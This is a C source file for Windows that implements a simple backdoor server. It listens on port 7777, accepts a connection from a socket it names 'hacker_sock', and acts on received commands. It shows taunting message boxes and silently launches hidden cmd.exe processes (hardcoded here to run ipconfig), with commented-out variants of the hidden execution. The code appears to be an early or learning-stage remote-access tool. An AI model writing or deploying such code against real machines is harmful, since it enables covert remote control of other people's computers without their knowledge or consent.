#include "Server.h"

#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "Ws2_32.lib")

BOOL InitServer(PSERVER server)
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		return FALSE;
	}

	server->listen_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (server->listen_sock == INVALID_SOCKET)
	{
		return FALSE;
	}

	server->addr_sock.sin_family      = AF_INET;
	server->addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
	server->addr_sock.sin_port        = htons(7777);

	if (bind(server->listen_sock, (LPSOCKADDR)&server->addr_sock, sizeof(struct sockaddr)))
		return FALSE;

	if (listen(server->listen_sock, 1))
		return FALSE;

	return TRUE;
}

VOID RunServer(PSERVER server)
{
	TCHAR  cmd[CMD_LENGTH + 1]    = { 0 }, // (cmd + space) + '\0'
		  args[MAX_BUFFER_LENGTH] = { 0 };
	while (TRUE)
	{
		SOCKET hacker_sock = accept(server->listen_sock, NULL, NULL);
		if (hacker_sock == INVALID_SOCKET)
		{
			return;
		}

		while (TRUE)
		{
			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
			recv(hacker_sock, args, ARGS_LENGTH, 0);

			if (!bytes || bytes == SOCKET_ERROR)
				break;

			_tprintf("cmd:'%s', args:'%s'\n", cmd, args);
			switch (cmd[0])
			{
			case MESSAGE:
				MessageBox(0, args, TEXT("GG WP"), MB_ICONERROR);
				break;

			case EXECUTE: {
				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
				//strcat_s(buf, ARGS_LENGTH + 3, args);
				// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
				// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
				// shell.lpFile = "cmd.exe";
				// shell.lpParameters = "ipconfig > a.txt";
				// shell.nShow = SW_HIDE;
				// ShellExecuteEx(&shell);
				// WaitForSingleObject(shell.hProcess, INFINITE);
				ShellExecute(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
				break; 
			}

			default:
				break;
			}	

			// send(hacker_sock, success, strlen(success), 0);
		}

		// shutdown(hacker_sock, 1);
		closesocket(hacker_sock);
	}
}
